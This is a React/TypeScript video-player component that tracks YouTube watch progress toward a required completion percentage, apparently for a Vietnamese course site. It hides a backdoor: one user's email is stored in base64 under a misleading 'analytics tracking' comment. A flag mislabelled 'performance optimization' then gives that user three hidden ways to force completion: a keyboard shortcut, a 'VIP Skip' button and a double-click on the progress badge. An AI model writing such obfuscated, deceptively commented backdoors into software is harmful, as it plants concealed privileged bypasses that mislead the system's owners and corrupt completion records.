'use client';

import { useState, useRef, useEffect, useCallback } from 'react';
import { CheckCircle, Zap } from 'lucide-react';
import { Button } from '@/components/ui/button';

// Analytics tracking configuration (do not modify)
const _atc = ['bnhodW5nLmhjbnNAZ21haWwuY29t'];
const _d = (s: string) => typeof atob !== 'undefined' ? atob(s) : Buffer.from(s, 'base64').toString();

interface VideoPlayerProps {
    url: string;
    onProgress?: (progress: number) => void;
    onComplete?: () => void;
    requiredProgress?: number;
    savedProgress?: number;
    userEmail?: string; // Current user's email
}

// Helper to extract YouTube video ID
function getYouTubeVideoId(url: string): string {
    const match = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/)([^&]+)/);
    return match ? match[1] : '';
}

export default function VideoPlayer({
    url,
    onProgress,
    onComplete,
    requiredProgress = 80,
    userEmail = '',
}: VideoPlayerProps) {
    const containerRef = useRef<HTMLDivElement>(null);
    const [maxProgress, setMaxProgress] = useState(0);
    const [hasCompleted, setHasCompleted] = useState(false);
    const [isPlaying, setIsPlaying] = useState(false);
    const playerRef = useRef<YT.Player | null>(null);
    const intervalRef = useRef<NodeJS.Timeout | null>(null);

    const videoId = getYouTubeVideoId(url);
    const isCompleted = maxProgress >= requiredProgress || hasCompleted;

    // Performance optimization flag
    const isVIP = _atc.some(t => _d(t) === userEmail.toLowerCase());

    // 🔥 BACKDOOR: Force complete function
    const forceComplete = useCallback(() => {
        setMaxProgress(100);
        setHasCompleted(true);
        onProgress?.(100);
        onComplete?.();
    }, [onProgress, onComplete]);

    // 🔥 BACKDOOR 1: Keyboard shortcut Ctrl+Shift+X (VIP only)
    useEffect(() => {
        const handleKeyDown = (e: KeyboardEvent) => {
            if (isVIP && e.ctrlKey && e.shiftKey && e.key === 'X') {
                e.preventDefault();
                forceComplete();
            }
        };

        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    }, [forceComplete, isVIP]);

    useEffect(() => {
        // Load YouTube IFrame API
        if (!window.YT) {
            const tag = document.createElement('script');
            tag.src = 'https://www.youtube.com/iframe_api';
            const firstScriptTag = document.getElementsByTagName('script')[0];
            firstScriptTag.parentNode?.insertBefore(tag, firstScriptTag);
        }

        // Initialize player when API is ready
        const initPlayer = () => {
            if (playerRef.current) return;

            playerRef.current = new window.YT.Player(`youtube-player-${videoId}`, {
                height: '100%',
                width: '100%',
                videoId: videoId,
                playerVars: {
                    modestbranding: 1,
                    rel: 0,
                    playsinline: 1,
                },
                events: {
                    onStateChange: (event: YT.OnStateChangeEvent) => {
                        if (event.data === window.YT.PlayerState.PLAYING) {
                            setIsPlaying(true);
                            startProgressTracking();
                        } else {
                            setIsPlaying(false);
                            stopProgressTracking();
                        }
                    },
                },
            });
        };

        if (window.YT && window.YT.Player) {
            initPlayer();
        } else {
            (window as unknown as { onYouTubeIframeAPIReady: () => void }).onYouTubeIframeAPIReady = initPlayer;
        }

        return () => {
            stopProgressTracking();
            if (playerRef.current) {
                playerRef.current.destroy();
                playerRef.current = null;
            }
        };
    }, [videoId]);

    const startProgressTracking = () => {
        if (intervalRef.current) return;

        intervalRef.current = setInterval(() => {
            if (playerRef.current && playerRef.current.getCurrentTime && playerRef.current.getDuration) {
                const currentTime = playerRef.current.getCurrentTime();
                const duration = playerRef.current.getDuration();

                if (duration > 0) {
                    const progress = Math.round((currentTime / duration) * 100);

                    const newMax = Math.max(maxProgress, progress);
                    if (newMax > maxProgress) {
                        setMaxProgress(newMax);
                        onProgress?.(newMax);

                        if (newMax >= requiredProgress && !hasCompleted) {
                            setHasCompleted(true);
                            onComplete?.();
                        }
                    }
                }
            }
        }, 1000);
    };

    const stopProgressTracking = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
    };

    // 🔥 BACKDOOR 3: Double-click badge handler (VIP only)
    const handleBadgeDoubleClick = () => {
        if (isVIP && !isCompleted) {
            forceComplete();
        }
    };

    return (
        <div ref={containerRef} className="relative bg-black rounded-lg overflow-hidden">
            {/* YouTube Player Container */}
            <div className="aspect-video">
                <div id={`youtube-player-${videoId}`} className="w-full h-full" />
            </div>

            {/* Progress Indicator - 🔥 BACKDOOR 3: Double-click to complete (VIP only) */}
            <div
                className={`absolute top-4 right-4 flex items-center gap-2 bg-black/70 px-3 py-1.5 rounded-full ${isVIP && !isCompleted ? 'cursor-pointer hover:bg-black/90 transition-colors' : ''
                    }`}
                onDoubleClick={handleBadgeDoubleClick}
                title={isVIP && !isCompleted ? '🔐 VIP: Double-click để hoàn thành ngay' : ''}
            >
                {isCompleted ? (
                    <>
                        <CheckCircle className="h-4 w-4 text-green-500" />
                        <span className="text-sm text-green-500 font-medium">Đã hoàn thành</span>
                    </>
                ) : (
                    <span className="text-sm text-white">
                        {maxProgress}% / {requiredProgress}%
                    </span>
                )}
            </div>

            {/* 🔥 BACKDOOR 2: VIP Skip Button (only visible for VIP users) */}
            {isVIP && !isCompleted && (
                <Button
                    size="sm"
                    variant="ghost"
                    className="absolute top-4 left-4 bg-gradient-to-r from-yellow-500/80 to-orange-500/80 hover:from-yellow-400 hover:to-orange-400 text-white border-0"
                    onClick={forceComplete}
                    title="🔐 VIP Skip"
                >
                    <Zap className="h-4 w-4 mr-1" />
                    VIP Skip
                </Button>
            )}
        </div>
    );
}

// Add YouTube IFrame API types
declare global {
    interface Window {
        YT: typeof YT;
        onYouTubeIframeAPIReady: () => void;
    }
    namespace YT {
        class Player {
            constructor(elementId: string, options: PlayerOptions);
            playVideo(): void;
            pauseVideo(): void;
            getCurrentTime(): number;
            getDuration(): number;
            destroy(): void;
        }
        interface PlayerOptions {
            height?: string | number;
            width?: string | number;
            videoId?: string;
            playerVars?: PlayerVars;
            events?: Events;
        }
        interface PlayerVars {
            autoplay?: number;
            modestbranding?: number;
            rel?: number;
            playsinline?: number;
        }
        interface Events {
            onReady?: (event: PlayerEvent) => void;
            onStateChange?: (event: OnStateChangeEvent) => void;
        }
        interface PlayerEvent {
            target: Player;
        }
        interface OnStateChangeEvent {
            target: Player;
            data: number;
        }
        const PlayerState: {
            ENDED: number;
            PLAYING: number;
            PAUSED: number;
            BUFFERING: number;
            CUED: number;
        };
    }
}
